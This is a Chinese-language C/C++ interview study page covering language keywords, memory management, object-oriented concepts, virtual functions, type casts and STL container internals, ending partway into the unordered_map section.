<h1 id="使用-const-和-define-定义常量的区别"><a href="#使用-const-和-define-定义常量的区别" class="headerlink" title="使用 const 和 define 定义常量的区别"></a>使用 const 和 define 定义常量的区别</h1><ul>
<li>const 定义的常量是变量，带有数据类型，而 define 定义的常量是预处理器替换的文本，不带数据类型。</li>
<li>const 定义的常量在编译运行时起作用，可以进行调试，而 define 定义的常量在预处理阶段起作用，不能进行调试。</li>
<li>const 定义的常量可以进行作用域限制，而 define 定义的常量没有作用域的概念。</li>
<li>const 定义的常量可以进行类型检查，而 define 定义的常量不能进行类型检查。</li>
</ul>
<h1 id="extern-的作用，extern-变量在内存的哪个数据段，为什么要-extern-C"><a href="#extern-的作用，extern-变量在内存的哪个数据段，为什么要-extern-C" class="headerlink" title="extern 的作用，extern 变量在内存的哪个数据段，为什么要 extern C"></a>extern 的作用，extern 变量在内存的哪个数据段，为什么要 extern C</h1><h2 id="extern-的作用"><a href="#extern-的作用" class="headerlink" title="extern 的作用"></a>extern 的作用</h2><p>extern 是 C 语言的关键字，用来引用不在同一个文件的变量或函数。</p>
<h2 id="extern-变量存储在在内存的哪个数据段"><a href="#extern-变量存储在在内存的哪个数据段" class="headerlink" title="extern 变量存储在在内存的哪个数据段"></a>extern 变量存储在在内存的哪个数据段</h2><p>extern 修饰一个变量，表明该变量是一个外部变量，也就是全局变量，因此存储在内存的静态存储区（全局区），也就是说它的生命周期是整个程序的运行周期。</p>
<h2 id="为什么要-extern-C"><a href="#为什么要-extern-C" class="headerlink" title="为什么要 extern C"></a>为什么要 extern C</h2><p>extern C 的作用是用来在 C++ 程序中调用 C 的函数，由于 C++ 支持函数重载，因此 C++ 的函数名会经过编译器的修饰，而 C 的函数名不会，因此需要用 extern C 来告诉编译器按照 C 的方式来处理函数名。</p>
<h1 id="const-关键字的用法"><a href="#const-关键字的用法" class="headerlink" title="const 关键字的用法"></a>const 关键字的用法</h1><ul>
<li>用来修饰指针变量，防止修改指针指向的内容或地址。</li>
<li>用来修饰变量，使得该变量的值在初始化后不能被修改。</li>
<li>用来修饰类的成员函数，使得函数不能修改类的成员变量。</li>
</ul>
<h1 id="各类型的-sizeof-是多少，指针的-sizeof-是多少，sizeof-实现原理"><a href="#各类型的-sizeof-是多少，指针的-sizeof-是多少，sizeof-实现原理" class="headerlink" title="各类型的 sizeof() 是多少，指针的 sizeof() 是多少，sizeof() 实现原理"></a>各类型的 sizeof() 是多少，指针的 sizeof() 是多少，sizeof() 实现原理</h1><h2 id="各类型的-sizeof-值"><a href="#各类型的-sizeof-值" class="headerlink" title="各类型的 sizeof() 值"></a>各类型的 sizeof() 值</h2><p>不同环境下各类型的 sizeof() 可能不同，这取决于机器和编译器，以下为 MSVC 32 bit 环境下各类型大小。</p>
<table>
<thead>
<tr>
<th align="center">type</th>
<th align="center">size</th>
</tr>
</thead>
<tbody><tr>
<td align="center">bool</td>
<td align="center">1B</td>
</tr>
<tr>
<td align="center">char</td>
<td align="center">1B</td>
</tr>
<tr>
<td align="center">int</td>
<td align="center">4B</td>
</tr>
<tr>
<td align="center">float</td>
<td align="center">4B</td>
</tr>
<tr>
<td align="center">double</td>
<td align="center">8B</td>
</tr>
</tbody></table>
<h2 id="指针的-sizeof-值"><a href="#指针的-sizeof-值" class="headerlink" title="指针的 sizeof() 值"></a>指针的 sizeof() 值</h2><p>由于指针存储的实质上是地址，因此它的大小取决于机器位数，在 32 位环境下为 4B，在 64 位环境下为 8B.</p>
<h2 id="sizeof-实现原理"><a href="#sizeof-实现原理" class="headerlink" title="sizeof() 实现原理"></a>sizeof() 实现原理</h2><p>sizeof() 是在编译期间，通过查找符号表，判断类型，然后根据基础类型来取值。对于基本数据类型，sizeof() 直接返回它们的固定大小；对于复合类型，如结构体类型，sizeof() 会考虑它们的内部结构和对齐方式，并返回它们的总大小。</p>
<h1 id="C-语言的-volatile-有什么用，可以和-const-同时使用吗"><a href="#C-语言的-volatile-有什么用，可以和-const-同时使用吗" class="headerlink" title="C 语言的 volatile 有什么用，可以和 const 同时使用吗"></a>C 语言的 volatile 有什么用，可以和 const 同时使用吗</h1><h2 id="volatile-的作用"><a href="#volatile-的作用" class="headerlink" title="volatile 的作用"></a>volatile 的作用</h2><p>C 语言的 volatile 是一个修饰符，用来告诉编译器不要对 volatile 修饰的变量进行优化，而是每次都从内存中读取它的值。这是因为 volatile 变量可能会被外部因素改变，比如中断、硬件设备或者多线程。</p>
<h2 id="可以和-const-同时使用吗"><a href="#可以和-const-同时使用吗" class="headerlink" title="可以和 const 同时使用吗"></a>可以和 const 同时使用吗</h2><p>const 是另一个修饰符，用来声明一个只读变量。</p>
<p>volatile 和 const 可以同时使用，表示一个只读的但可能会被外部因素改变的变量。</p>
<h1 id="C-引用的概念"><a href="#C-引用的概念" class="headerlink" title="C++ 引用的概念"></a>C++ 引用的概念</h1><ul>
<li>引用是 C++ 相对于 C 语言的一个扩充。C++ 引用的概念是指一个变量的别名，也就是说，它是某个已存在变量的另一个名字，通过这个名字和原本的名字都可以找到其指定的数据。</li>
<li>引用必须初始化，且初始化后不能改变其所绑定的对象。</li>
<li>引用的本质是指针，底层实现还是指针。</li>
</ul>
<h1 id="指针和引用的区别"><a href="#指针和引用的区别" class="headerlink" title="指针和引用的区别"></a>指针和引用的区别</h1><ul>
<li>指针是一个变量，存储的是一个地址，指向内存的一个存储单元；引用是原变量的一个别名，与其引用的变量实质上是同一个东西。</li>
<li>指针可以不初始化，也可以为空；引用必须初始化，且不能为空。</li>
<li>指针可以改变指向；引用不能改变指向。</li>
<li>指针可以有多级；引用只能有一级。</li>
<li>指针作为函数参数传递时传递的是指针变量的值，而引用作为参数传递的是实参本身。</li>
</ul>
<h1 id="内联函数的作用"><a href="#内联函数的作用" class="headerlink" title="内联函数的作用"></a>内联函数的作用</h1><ul>
<li>由于函数调用过程需要进行参数传递、上下文保存与恢复等操作，因此会引入时间与空间上的额外开销。通过编译器预处理，在调用内联函数的地方将内联函数内的语句复制到调用函数处，也就是直接展开代码执行，从而提高了效率，减少了不必要的开销。</li>
<li>内联函数相比宏定义函数来说，有参数类型检查，执行更加安全。</li>
<li>声明内联函数使用关键字 inline，但该关键字并不是一个强制要求，只是对编译器的一个建议，当内联函数体包含循环或递归等复杂结构时，编译器将不接受该建议，而将该函数当作普通函数对待。</li>
</ul>
<h1 id="简述-C-的内存管理"><a href="#简述-C-的内存管理" class="headerlink" title="简述 C++ 的内存管理"></a>简述 C++ 的内存管理</h1><ul>
<li><strong>代码区</strong>：存放程序的可执行指令，通常是只读的，可以被多个进程共享。</li>
<li><strong>数据区</strong>：存放程序的全局变量和静态变量，分为初始化和未初始化两部分。初始化部分包含了程序赋予初始值的变量，未初始化部分包含了程序没有赋予初始值的变量。</li>
<li><strong>堆</strong>：存放程序动态分配的内存，由程序员控制其生命周期。堆是一个向上增长的数据结构，可以根据需要扩展或收缩。使用 new 和 delete 操作符分配和释放堆上的内存时，需要注意避免内存泄漏或野指针等问题。</li>
<li><strong>栈</strong>：存放程序的局部变量和函数调用的参数和返回地址。栈是一个向下增长的数据结构，具有后进先出（LIFO）的特性。栈上的内存由编译器自动分配和释放，不需要程序员干预。栈上的内存空间通常有限，因此不适合存放大量或复杂的数据。</li>
</ul>
<h1 id="堆空间和栈空间的区别"><a href="#堆空间和栈空间的区别" class="headerlink" title="堆空间和栈空间的区别"></a>堆空间和栈空间的区别</h1><ul>
<li>堆空间是由程序员动态分配和释放的，栈空间是由编译器自动分配和释放的。</li>
<li>堆空间的大小可以根据需要扩展或收缩，栈空间的大小通常有限。</li>
<li>堆空间的访问速度比栈空间慢，堆空间也容易产生内存碎片或内存泄漏等问题。</li>
<li>堆空间的地址增长方向是向上的，也就是沿着内存地址增加的方向，而栈空间是向下的，也就是沿着内存地址减小的方向增长。</li>
</ul>
<h1 id="什么是内存泄漏，如何避免，如何检测"><a href="#什么是内存泄漏，如何避免，如何检测" class="headerlink" title="什么是内存泄漏，如何避免，如何检测"></a>什么是内存泄漏，如何避免，如何检测</h1><h2 id="什么是内存泄漏"><a href="#什么是内存泄漏" class="headerlink" title="什么是内存泄漏"></a>什么是内存泄漏</h2><p>内存泄漏是指程序中已动态分配的堆内存由于某种原因未能正确释放，造成系统资源的浪费，导致程序运行速度减慢甚至系统崩溃等严重后果。</p>
<h2 id="如何避免"><a href="#如何避免" class="headerlink" title="如何避免"></a>如何避免</h2><ul>
<li>养成良好的编码习惯，动态分配内存后及时释放。</li>
<li>使用智能指针来避免内存泄漏。</li>
</ul>
<h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><p>检测内存泄漏有多种方法，其中一种是使用 Visual Studio 的 CRT 库，它可以在调试时输出内存泄漏的报告，包括泄露的内存块和调用栈。</p>
<p>另一种方法时使用 Visual Leak Detector 这个开源工具，它可以在调试时检测和报告内存泄露。</p>
<h1 id="简述-C-的内存对齐"><a href="#简述-C-的内存对齐" class="headerlink" title="简述 C++ 的内存对齐"></a>简述 C++ 的内存对齐</h1><h2 id="什么是内存对齐"><a href="#什么是内存对齐" class="headerlink" title="什么是内存对齐"></a>什么是内存对齐</h2><p>内存对齐是指一个数据类型所定义的所有变量的内存地址都是某个数的倍数（通常为 4 或 8）。</p>
<h2 id="内存对齐的原因"><a href="#内存对齐的原因" class="headerlink" title="内存对齐的原因"></a>内存对齐的原因</h2><ul>
<li><strong>平台原因</strong>：不是所有的硬件平台都能访问任意地址上的任意数据，某些硬件平台只能在某些地址处取某些特定类型的数据，否则抛出硬件异常。</li>
<li><strong>性能原因</strong>：因为 CPU 一次读取地字节数是固定的，如果一个变量跨越了多个字节，就需要多次读取，因此为了提高 CPU 访问内存的效率，数据结构应该尽可能在自然边界上对齐。</li>
</ul>
<h2 id="内存对齐的规则"><a href="#内存对齐的规则" class="headerlink" title="内存对齐的规则"></a>内存对齐的规则</h2><p>内存对齐的规则是根据数据类型和编译器设置来确定的，一般有以下几点：</p>
<ul>
<li>结构体的第一个成员从 0 开始计算偏移量。</li>
<li>第二个和之后的成员要放在该成员的大小与对齐模数比取较小值的整数倍上。</li>
<li>结构体或类本身也要按照其最大属性大小与对齐模数比取较小值进行对齐。</li>
<li>如果使用了 C++11 提供的关键字 alignas 和 alignof，可以指定或查询某个类型或变量的对齐方式。</li>
</ul>
<h1 id="简述-malloc-的实现原理"><a href="#简述-malloc-的实现原理" class="headerlink" title="简述 malloc() 的实现原理"></a>简述 malloc() 的实现原理</h1><p>malloc() 是一个用于动态内存分配的函数，它返回一个指向至少 size 字节的连续内存区域的指针。</p>
<p>malloc() 的实现原理是维护一个内存空闲链表，当申请内存时，搜索内存空闲链表，找到适配的空闲内存空间，如果没有搜索到，那么就调用 sbrk() 推进 brk 指针来申请内存空间。然后将空间分割为两个内存块，一个变成分配块，一个变成新的空闲块。调用 free() 时，将用户释放的内存块连接到空闲链表上。</p>
<h1 id="简述-new-的实现原理，new-和-malloc-的区别是什么"><a href="#简述-new-的实现原理，new-和-malloc-的区别是什么" class="headerlink" title="简述 new 的实现原理，new 和 malloc() 的区别是什么"></a>简述 new 的实现原理，new 和 malloc() 的区别是什么</h1><h2 id="new-的实现原理"><a href="#new-的实现原理" class="headerlink" title="new 的实现原理"></a>new 的实现原理</h2><ul>
<li>对于基本数据类型，new 运算符直接调用 operator new() 函数， 在 operator new() 函数内会调用 malloc() 函数。</li>
<li>对于复杂数据类型，new 运算符先调用 operator new() 函数分配内存空间，然后在分配的内存空间上调用用构造函数。</li>
</ul>
<h2 id="new-和-malloc-的区别"><a href="#new-和-malloc-的区别" class="headerlink" title="new 和 malloc() 的区别"></a>new 和 malloc() 的区别</h2><ul>
<li><p>new 是运算符，而 malloc() 是函数。</p>
</li>
<li><p>new 不仅分配内存，还调用构造函数；malloc() 只分配内存，不调用构造函数。</p>
</li>
<li><p>new 返回指定类型的指针；malloc() 返回 void* 类型的指针。</p>
</li>
<li><p>new 可以重载；malloc() 不能重载。</p>
</li>
<li><p>new 申请分配空间失败会抛出异常；而 malloc() 会返回 NULL.</p>
</li>
</ul>
<h1 id="简述-delete-和-free-的区别"><a href="#简述-delete-和-free-的区别" class="headerlink" title="简述 delete 和 free() 的区别"></a>简述 delete 和 free() 的区别</h1><ul>
<li>delete 是运算符，而 free() 是函数。</li>
<li>delete 用于释放 new 分配的空间，free() 用于释放 malloc() 分配的空间。</li>
<li>delete 会调用对象的析构函数，free() 只释放内存。</li>
<li>delete 可以重载，free() 不能重载。</li>
</ul>
<h1 id="简述一下什么是面向对象"><a href="#简述一下什么是面向对象" class="headerlink" title="简述一下什么是面向对象"></a>简述一下什么是面向对象</h1><p>面向对象的三大特征：封装、继承和多态。面向对象思想是基于面向过程思想的，要说面向对象思想，首先说说面向过程思想。</p>
<p>面向过程是一种以过程为中心的编程思想，主要是使用函数实现面向过程的思想。面向过程是把解决问题的步骤分析出来，然后用函数把这些步骤实现，在一步一步的具体步骤中再按顺序调用函数。面向过程是一种最为实际的思考方式，也是一种基础的方法。</p>
<p>面向对象的思想是把要解决的问题分解成各个对象，每个对象都有自己的属性和行为。面向对象的编程是以对象为中心，通过调用对象的方法来实现功能。面向对象的编程有三大特征：封装、继承和多态。封装是把数据和操作数据的方法封装在一起，提高安全性和复用性；继承是子类可以继承父类的属性和方法，实现代码的重用；多态是不同的子类可以有不同的行为，提高程序的灵活性。</p>
<h1 id="简述一下-C-的重载和重写"><a href="#简述一下-C-的重载和重写" class="headerlink" title="简述一下 C++ 的重载和重写"></a>简述一下 C++ 的重载和重写</h1><p>C++ 的重载和重写是两个不同的概念。</p>
<ul>
<li><p><strong>重载</strong>是指在同一类中定义多个同名的函数，但是参数列表不同。重载可以实现<strong>编译时的多态性</strong>，即根据参数的类型和个数来选择合适的函数调用。重载是多个函数或者同一个类中方法之间的关系，是平行关系。</p>
</li>
<li><p><strong>重写</strong>是指在子类中重新定义父类中的虚函数，即函数名和参数都一样。重写可以实现<strong>运行时的多态性</strong>，即根据对象的实际类型来选择合适的函数调用。重写是父类与子类之间的关系，是垂直关系。</p>
</li>
</ul>
<h1 id="简述一下面向对象的三大特征"><a href="#简述一下面向对象的三大特征" class="headerlink" title="简述一下面向对象的三大特征"></a>简述一下面向对象的三大特征</h1><p>面向对象的三大特征是：封装、继承、多态。</p>
<ul>
<li><p><strong>封装</strong>是指将数据和行为组合成一个整体，对外部隐藏内部的实现细节，只提供必要的接口。封装可以保护数据的安全性，降低代码的复杂度，提高代码的可维护性。C++ 通过 private、protected、public 关键字来控制成员变量和成员函数的访问权限。</p>
</li>
<li><p><strong>继承</strong>是指子类可以继承父类的属性和方法，并且可以添加或修改自己特有的属性和方法。继承可以提高代码的复用性；提高代码的拓展性；同时也是多态的前提。</p>
</li>
<li><p><strong>多态</strong>是指不同类型的对象对同一消息可以做出不同的响应。多态可以分为编译时多态和运行时多态。编译时多态是指通过重载实现的多态，即在同一个类中定义了相同名称但不同参数的方法，根据调用时传递的参数不同而执行不同的方法。运行时多态是指通过重写实现的多态，即在子类中重新定义了父类中已有的方法，根据调用时使用的对象不同而执行不同的方法。多态可以实现接口的统一，增加程序的灵活性和可扩展性。</p>
</li>
</ul>
<h1 id="简述一下浅拷贝和深拷贝"><a href="#简述一下浅拷贝和深拷贝" class="headerlink" title="简述一下浅拷贝和深拷贝"></a>简述一下浅拷贝和深拷贝</h1><ul>
<li><p><strong>浅拷贝</strong>又称为值拷贝，将源对象的值拷贝到目标对象中，如果对象中有某个成员是指针类型数据，并且是在堆区创建，则使用浅拷贝仅仅拷贝的是这个指针变量的值，也就是在目标对象中该指针类型数据和源对象中的该成员指向的是同一块堆空间。这样会带来一个问题，就是在析构函数中释放该堆区数据，会被释放多次。默认的拷贝构造函数和默认的赋值运算符重载函数都是浅拷贝。</p>
</li>
<li><p><strong>深拷贝</strong>在拷贝的时候先开辟出和源对象大小一样的空间，然后将源对象里的内容拷贝到目标对象中去，这样指针成员就指向了不同的内存位置。并且里面的内容是一样的，这样不但达到了拷贝的目的，还不会出现问题，两个对象先后去调用析构函数，分别释放自己指针成员所指向的内存。即为每次增加一个指针，便申请一块新的内存，并让这个指针指向新的内存，深拷贝情况下，不会出现重复释放同一块内存的错误。</p>
</li>
</ul>
<h1 id="简述一下-C-的多态"><a href="#简述一下-C-的多态" class="headerlink" title="简述一下 C++ 的多态"></a>简述一下 C++ 的多态</h1><p>C++ 的多态是指相同的对象收到不同的消息或不同的对象收到相同的消息时产生不同的实现动作。C++ 支持两种多态：编译时多态（静态多态）和运行时多态（动态多态）。</p>
<p>编译时多态是编译器在编译期间完成的，编译器会根据实参类型来选择调用合适的函数，如果有合适的函数就调用，没有的话就会发出警告或者报错。静态多态有函数重载、运算符重载、泛型编程等。</p>
<p>运行时多态是通过虚函数和继承来实现的，它是在运行阶段根据对象的类型来动态地确定函数调用的版本。虚函数允许子类重新定义成员函数，而子类重新定义父类的做法称为覆盖 (Override)，或者称为重写。</p>
<h1 id="简述一下虚函数的实现原理"><a href="#简述一下虚函数的实现原理" class="headerlink" title="简述一下虚函数的实现原理"></a>简述一下虚函数的实现原理</h1><p>编译器处理虚函数时，给每个对象添加一个隐藏的成员。隐藏的成员是一个指针类型的数据，指向的是函数地址数组，这个数组被称为虚函数表（virtual function table，vtbl）。虚函数表中存储的是类中的虚函数的地址。如果派生类重写了基类中的虚函数，则派生类对象的虚函数表中保存的是派生类的虚函数地址；如果派生类没有重写基类中的虚函数，则派生类对象的虚函数表中保存的是父类的虚函数地址。</p>
<p>因为虚函数需要虚函数表来实现动态绑定，而虚函数表会占用额外的内存空间，并且可能影响到编译器的优化，因此使用虚函数时，在内存和执行速度方面会有一定的开销。</p>
<h1 id="什么是纯虚函数，有什么作用"><a href="#什么是纯虚函数，有什么作用" class="headerlink" title="什么是纯虚函数，有什么作用"></a>什么是纯虚函数，有什么作用</h1><p>纯虚函数是一种特殊的虚函数，它在基类中没有函数体，只有函数声明，并且用 &lt;虚函数声明&gt; = 0 来标识。纯虚函数的作用是为了实现一个接口，起到一个规范的作用，规范继承这个类的程序员必须实现这个函数。如果一个类中有纯虚函数，那么这个类就是一个抽象类，不能被实例化，只能被继承。</p>
<h1 id="虚析构函数有什么作用"><a href="#虚析构函数有什么作用" class="headerlink" title="虚析构函数有什么作用"></a>虚析构函数有什么作用</h1><p>虚析构函数是为了避免内存泄漏，而且是当子类中有指针成员变量时才使用得到。虚析构函数使得在释放指向子类对象的基类指针时，可以调用子类的析构函数来实现释放子类堆内存的目的，从而防止内存泄漏。如果基类的析构函数是虚函数，那么派生类的析构函数不论是否用 virtual 关键字声明，都自动成为虚析构函数。</p>
<h1 id="重载、重写、隐藏有什么区别"><a href="#重载、重写、隐藏有什么区别" class="headerlink" title="重载、重写、隐藏有什么区别"></a>重载、重写、隐藏有什么区别</h1><ul>
<li>重载是指同一作用域中，函数名相同但参数列表不同的函数。</li>
<li>重写是指派生类中重新定义了与基类中同名、同参数列表、同返回值类型的虚函数。</li>
<li>隐藏是指不同作用域中定义的同名函数构成隐藏。如派生类中定义了与基类中同名的函数，无论参数列表是否相同，基类函数都会被隐藏。</li>
</ul>
<h1 id="什么情况会调用拷贝构造，什么时候会调用赋值操作"><a href="#什么情况会调用拷贝构造，什么时候会调用赋值操作" class="headerlink" title="什么情况会调用拷贝构造，什么时候会调用赋值操作"></a>什么情况会调用拷贝构造，什么时候会调用赋值操作</h1><ul>
<li>拷贝构造函数是用一个已经存在的对象来初始化另一个新创建的对象。拷贝构造函数有三种情况会被调用：<ul>
<li>当用类的一个对象去初始化类的另一个对象时，如 <code>Data data1; Data data2 = data1;</code>.</li>
<li>函数的形参是类的非引用对象，进行参数传递时。</li>
</ul>
</li>
<li>赋值操作符是将一个已经存在的对象赋给另一个已经存在的对象。只有当两个对象初始化之后，通过 = 运算符进行赋值的时候，如 <code>Data data1; Data data2; data2 = data1;</code>.</li>
</ul>
<h1 id="虚函数可以是内联函数吗"><a href="#虚函数可以是内联函数吗" class="headerlink" title="虚函数可以是内联函数吗"></a>虚函数可以是内联函数吗</h1><ul>
<li>虚函数可以是内联函数，但是当虚函数表现多态性的时候不能内联。因为内联是在编译期建议编译器内联，而虚函数的多态性在运行期，编译器无法知道运行期调用哪个函数。 </li>
<li>inline virtual 唯一可以内联的时候是：编译器知道所调用的对象是哪个类，这只有在编译器具有实际对象而不是对象的指针或引用时才会发生。</li>
</ul>
<h1 id="简述虚函数与纯虚函数的区别"><a href="#简述虚函数与纯虚函数的区别" class="headerlink" title="简述虚函数与纯虚函数的区别"></a>简述虚函数与纯虚函数的区别</h1><ul>
<li>虚函数可以有定义，也可以没有定义；纯虚函数一定没有定义，只是声明了接口。</li>
<li>虚函数可以被子类重写（override），也可以不被重写；纯虚函数必须被子类实现。</li>
<li>虚函数的声明形式是 virtual void func(); 纯虚函数的声明形式是 virtual void func() = 0;</li>
<li>含有纯虚函数的类叫做抽象类，不能实例化，派生类必须实现父类所有的纯虚函数才可以实例化，否则也是抽象类；而含有虚函数的类则无此限制。</li>
</ul>
<h1 id="简述-C-的四种类型转换"><a href="#简述-C-的四种类型转换" class="headerlink" title="简述 C++ 的四种类型转换"></a>简述 C++ 的四种类型转换</h1><ul>
<li><strong>static_cast：</strong>明确指出类型转换，没有动态类型检查，上行转换（派生类到基类）安全，下行转换（基类到派生类）不安全。</li>
<li><strong>dynamic_cast：</strong>用于有条件的转换，动态类型检查，运行时检查类型安全（转换失败返回 NULL），只能用于多态类型的指针或引用。</li>
<li><strong>const_cast：</strong>用于改变运算对象的底层 const 属性，不能改变其顶层 const 属性。</li>
<li><strong>reinterpret_cast：</strong>用于无关类型之间的转换，如整型和指针，不同类型的指针等。</li>
</ul>
<h1 id="STL-中有哪些常见的容器"><a href="#STL-中有哪些常见的容器" class="headerlink" title="STL 中有哪些常见的容器"></a>STL 中有哪些常见的容器</h1><p>STL 中的容器是用来管理某类对象的数据结构，可以分为顺序容器和关联容器两大类。</p>
<p><strong>顺序容器</strong>是指元素位置取决于插入顺序的容器，有 vector、deque、list、forward_list、string、array .</p>
<ul>
<li>vector：可变大小数组。支持快速随机访问。在尾部之外的位置增删元素可能很慢。</li>
<li>deque：双端队列。支持快速随机访问。在头尾位置增删元素速度很快。</li>
<li>list：双向链表。只支持双向顺序访问。在任何位置增删元素都能在常数时间完成。不支持随机存取。</li>
<li>forward_list：单向链表。只支持单向顺序访问。在链表的任何位置增删元素都能在常数时间内完成，由于没有了 size 操作以及简化了增删元素的链表节点操作，速度相比双向链表更快。不支持随机存取。</li>
<li>string：字符串。与 vector 相似的容器，但专门用于保存字符。随机访问快。在尾部增删元素快。</li>
<li>array：定长数组。支持快速随机访问。不能添加和删除元素。</li>
</ul>
<p><strong>关联容器</strong>是指元素位置取决于排序准则或键值的容器，有 map、set、multimap、multiset、unordered_map、unordered_set、unordered_multimap、unordered_multiset.</p>
<ul>
<li>map：关联数组。保存键值对。</li>
<li>set：关键字即值，即只保存关键字的容器。</li>
<li>multimap：关键字可重复出现的 map.</li>
<li>multiset：关键字可重复出现的 set.</li>
<li>unordered_map：用哈希函数组织的 map.</li>
<li>unordered_set：用哈希函数组织的 set.</li>
<li>unordered_multimap：用哈希函数组织的 map；关键字可重复出现。</li>
<li>unordered_multiset：用哈希函数组织的 set；关键字可重复出现。</li>
</ul>
<p>除了这些基本的容器，STL 还提供了一些容器适配器，如 stack、queue 和 priority_queue，它们是对其他容器进行封装和修改而得到的特殊用途的数据结构。</p>
<h1 id="vector-和-list-有什么区别，分别适用于什么场景"><a href="#vector-和-list-有什么区别，分别适用于什么场景" class="headerlink" title="vector 和 list 有什么区别，分别适用于什么场景"></a>vector 和 list 有什么区别，分别适用于什么场景</h1><p>vector 和 list 的区别主要有以下几点：</p>
<ul>
<li>vector 底层是数组，list 底层是双向链表。</li>
<li>vector 支持随机访问，list 不支持。</li>
<li>vector 中的数据存储在连续的内存空间，而 list 中的元素在内存中的存放不是连续的。</li>
<li>vector 在中间增删元素会导致内存拷贝，list 不会。</li>
</ul>
<p>一般来说，如果需要频繁的随机访问和查询，可以使用 vector；如果需要频繁的插入删除操作，可以使用 list。</p>
<h1 id="简述-vector-的实现原理"><a href="#简述-vector-的实现原理" class="headerlink" title="简述 vector 的实现原理"></a>简述 vector 的实现原理</h1><p>vector 是一种动态数组，在内存中具有连续的存储空间，支持快速随机访问。</p>
<p>由于具有连续的存储空间，所以在插入和删除操作方面，效率较低。 当 vector 的大小和容量相等（size == capacity），如果再向其添加元素，那么 vector 就需要扩容。vector 容器扩容的过程需要经历以下 3 步： </p>
<ol>
<li>完全弃用现有的内存空间，重新申请更大的内存空间。 </li>
<li>将旧内存空间中的数据，按原有顺序移动到新的内存空间中。 </li>
<li>最后将旧的内存空间释放。 vector 扩容是非常耗时的。为了降低再次分配内存空间时的成本，每次扩容时 vector 都会申请比用户需求量更多的内存空间（这也就是 vector 容量的由来，即 capacity &gt;= size），以便后期使用。</li>
</ol>
<p>不同的编译器在扩容时所采用的扩容因子可能不同，比如 MSVC 的扩容因子为 1.5，即每次扩容时容量变为原来的 1.5 倍。</p>
<h1 id="迭代器失效的原因是什么，有哪些情况"><a href="#迭代器失效的原因是什么，有哪些情况" class="headerlink" title="迭代器失效的原因是什么，有哪些情况"></a>迭代器失效的原因是什么，有哪些情况</h1><p>STL 中某些容器调用了某些成员方法后会导致迭代器失效。</p>
<p>顺序容器迭代器失效：如 vector，由于容器内的元素是连续存储的，对容器执行元素插入操作后，如果导致容器扩容，那么所有的迭代器都将失效；如果没有扩容，那么插入位置之后的迭代器都会失效。而删除元素不会导致扩容，因此只有删除位置之后的迭代器会失效。</p>
<p>关联式容器迭代器失效：对于关联容器，如 map、 set，删除当前的迭代器，仅仅会使当前的迭代器失效，这是因为 map 之类的容器，使用了红黑树来实现，插入、删除一个节点不会对其他点造成影响。</p>
<h1 id="简述-deque-的实现原理"><a href="#简述-deque-的实现原理" class="headerlink" title="简述 deque 的实现原理"></a>简述 deque 的实现原理</h1><p>deque 由一段一段的定量的连续空间构成，每段空间称为一个缓冲区。这些缓冲区通过一个 map 数组作为主控来进行管理，map 数组中存储了指向每个缓冲区的指针。deque 最大的工作就是维护这些分段连续的内存空间逻辑上的整体性，并提供随机存取的接口，避开了重新配置空间，复制，释放的轮回，代价就是复杂的迭代器架构。</p>
<h1 id="简述-set-的实现原理"><a href="#简述-set-的实现原理" class="headerlink" title="简述 set 的实现原理"></a>简述 set 的实现原理</h1><p>set 底层使用红黑树实现，一种高效的平衡二叉搜索树。 </p>
<ul>
<li>set 的插入操作是先在红黑树中找到合适的位置，然后创建一个新节点，并将其颜色设为红色。如果新节点的父节点也是红色，那么就需要进行旋转和变色操作来恢复平衡。</li>
<li>set 的删除操作是先在红黑树中找到要删除的节点，然后用其后继或前驱替换它，并释放原来的节点。如果被删除或替换的节点是黑色，那么就需要进行旋转和变色操作来恢复平衡。</li>
<li>set 的查找操作是沿着二叉搜索树的路径向下查找，直到找到目标元素或者为空为止。由于红黑树保证了高度平衡，所以查找操作的时间复杂度为 O(log n)。</li>
</ul>
<h1 id="简述-map-的实现原理，各操作的时间复杂度是多少"><a href="#简述-map-的实现原理，各操作的时间复杂度是多少" class="headerlink" title="简述 map 的实现原理，各操作的时间复杂度是多少"></a>简述 map 的实现原理，各操作的时间复杂度是多少</h1><ul>
<li>map 是一种模板类，它的模板参数是键值对的类型和比较函数。比较函数用来定义键值对之间的大小关系，从而确定键值对在红黑树中的位置。</li>
<li>map 的底层数据结构也是红黑树，它与 set 的红黑树相同，只是每个节点存储的不是单个元素，而是一个 pair 对象，包含一个 key 和一个 value。</li>
<li>map 的插入操作是先在红黑树中找到合适的位置，然后创建一个新节点，并将其颜色设为红色。如果新节点的父节点也是红色，那么就需要进行旋转和变色操作来恢复平衡。</li>
<li>map 的删除操作是先在红黑树中找到要删除的节点，然后用其后继或前驱替换它，并释放原来的节点。如果被删除或替换的节点是黑色，那么就需要进行旋转和变色操作来恢复平衡。</li>
<li>map 的查找操作是沿着二叉搜索树的路径向下查找，直到找到目标键值对或者为空为止。</li>
</ul>
<p>由于红黑树保证了高度平衡，因此各操作的时间复杂度均为 O(log n)。</p>
<h1 id="简述红黑树的特性，为什么要有红黑树"><a href="#简述红黑树的特性，为什么要有红黑树" class="headerlink" title="简述红黑树的特性，为什么要有红黑树"></a>简述红黑树的特性，为什么要有红黑树</h1><h2 id="红黑树的特性"><a href="#红黑树的特性" class="headerlink" title="红黑树的特性"></a>红黑树的特性</h2><ul>
<li>每个节点只能是红色或者黑色。</li>
<li>根节点必须是黑色。</li>
<li>每个叶子节点（NIL 或 NULL）都是黑色。</li>
<li>如果一个节点是红色，那么它的两个子节点都是黑色。</li>
<li>从任一节点到其每个叶子节点的所有路径都包含相同数目的黑色节点。</li>
</ul>
<h2 id="为什么要有红黑树"><a href="#为什么要有红黑树" class="headerlink" title="为什么要有红黑树"></a>为什么要有红黑树</h2><p>虽然平衡二叉树解决了二叉搜索树退化为近似链表的缺点，能够把查找时间控制在 O(log n)，但却不是最佳的。因为平衡二叉树要求每个节点的左子树和右子树的高度差至多等于 1，这个要求实在过于苛刻，导致每次进行插入/删除节点的时候，几乎都会破坏平衡树的这一规则，进而导致需要通过左旋和右旋来进行调整，使之再次成为一颗符合要求的平衡树。</p>
<p>显然，在那些插入、删除频率较高的场景中，平衡树需要频繁进行调整，这会使得平衡树的性能大打折扣，为了解决这个问题，就诞生了红黑树。</p>
<h1 id="简述-unordered-map-的实现原理"><a href="#简述-unordered-map-的实现原理" class="headerlink" title="简述 unordered_map 的实现原理"></a>简述 unordered_map 的实现原理</h1><p>unordered_map 是一种无序的关联容器，它存储了键值对的集合，其中每个键都是唯一的。</p>
